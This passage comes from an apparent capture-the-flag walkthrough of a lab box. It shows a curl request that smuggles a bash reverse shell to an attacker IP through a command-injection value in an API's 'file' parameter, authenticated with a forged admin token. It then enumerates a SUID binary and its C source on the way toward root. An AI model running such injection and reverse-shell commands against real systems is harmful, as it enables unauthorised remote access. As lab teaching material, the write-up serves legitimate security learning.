## Now I can update that to a simple Bash reverse shell (and start nc listening in a new terminal):
```bash
curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.16.21/9001 0>&1'" -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq -r .
```
## t just hangs, but at a listening nc there’s a shell as dasith:

```bash
nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.120 44874
bash: cannot set terminal process group (1093): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

## get user.txt
```bash
cat user.txt
53744424************************
```
#### Shell as root
### Enumeration

## The home directory of dasith is pretty empty otherwise. Looking around the rest of the box, /opt has interesting files:
```bash
dasith@secret:/opt$ ls -l
total 32
-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count
-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log
```
## count is a SUID binary, which means it will run as it’s owner regardless of who runs it. In this case, that user is root. Running it prompts for a filename:
```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: 
```
## It’s doing a fancy word count on the given file (and adding an extra word and line?), and then prompting about saving to a file. If I say yes, it save these stats:

```bash
Save results a file? [y/N]: y
Path: /tmp/blackbash
dasith@secret:/opt$ cat /tmp/blackbash 
Total characters = 33
Total words      = 2
Total lines      = 2
```
## Giving it a directory instead of a file, it prints the files in that directory and their permissions:

```bash
dasith@secret:/opt$ ./count       
Enter source file/directory name: /root
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]:
```
## code.c is the source for this application let's take alook at it

```bash
#include <stdio.h>
#include <stdlib.h>          
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
...[snip]...
}


void filecount(const char *path, char *summary)
{
...[snip]...
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```
## What’s especially interesting is that after getting the stats, it drops privs for file write by setting the uid to the result of getuid. With a SUID binary, this will be the actual userid of who ran the binary, in this case, dasith. This means I can’t use this to write in directories I can’t otherwise access.

## This bit is interesting as well:

```bash
 // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
```


